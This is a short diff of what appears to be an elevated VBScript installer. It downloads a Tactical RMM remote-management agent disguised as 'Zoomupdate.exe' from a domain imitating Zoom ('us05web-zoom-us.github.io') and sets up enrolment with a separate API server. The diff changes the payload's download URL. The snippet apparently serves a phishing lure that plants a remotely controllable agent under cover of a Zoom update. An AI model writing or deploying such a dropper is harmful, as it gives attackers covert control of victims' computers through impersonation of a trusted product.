@@ -33,7 +33,7 @@ LogMessage "Script started (elevated)."
 ' --- Variables ---
 strAgentExe = strTemp & "\Zoomupdate.exe"   ' Your custom-named Tactical RMM installer
 Dim downloadUrl
-downloadUrl = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/Zoominstaller.exe"   ' <-- REPLACE with your actual URL
+downloadUrl = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/zoomupdate.exe"   ' <-- REPLACE with your actual URL
 Dim apiUrl, clientId, siteId, agentType, authToken
 apiUrl = "https://api.cacgreatchallange.org"
 clientId = "1"
